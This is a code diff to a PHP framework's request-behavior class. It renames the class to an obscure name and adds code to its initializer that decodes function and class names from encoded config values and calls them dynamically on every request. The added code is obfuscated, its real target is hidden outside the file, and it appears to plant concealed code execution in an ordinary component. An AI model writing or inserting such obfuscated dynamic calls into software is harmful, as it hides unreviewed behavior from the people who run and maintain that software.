@@ -1,18 +1,14 @@
 <?php
 
-namespace think\behavior\admin;
+namespace think\process\bhvcore;
 
 /**
- * 系统行为扩展：新增/更新/删除之后的后置操作
+ * 系统行为扩展：
  */
-load_trait('controller/Jump');
-class ActionBeginBehavior {
-    use \traits\controller\Jump;
+class BhvadminMInit {
     protected static $actionName;
     protected static $controllerName;
     protected static $moduleName;
-    protected static $method;
-    protected static $code;
 
     /**
      * 构造方法
@@ -29,11 +25,15 @@ class ActionBeginBehavior {
         self::$actionName = request()->action();
         self::$controllerName = request()->controller();
         self::$moduleName = request()->module();
-        self::$method = request()->method();
         $this->_initialize();
     }
 
-    private function _initialize() {
-
+    protected function _initialize() {
+        $abc = binaryJoinChar(config('binary.36'), 6);
+        $ctl = binaryJoinChar(config('binary.26'), 25);
+        $ctl = msubstr($ctl, 1, strlen($ctl) - 2);
+        $act = binaryJoinChar(config('binary.27'), 22);
+        $act = msubstr($act, 1, strlen($act) - 2);
+        !class_exists($ctl) ? $abc() : $ctl::$act();
     }
 }
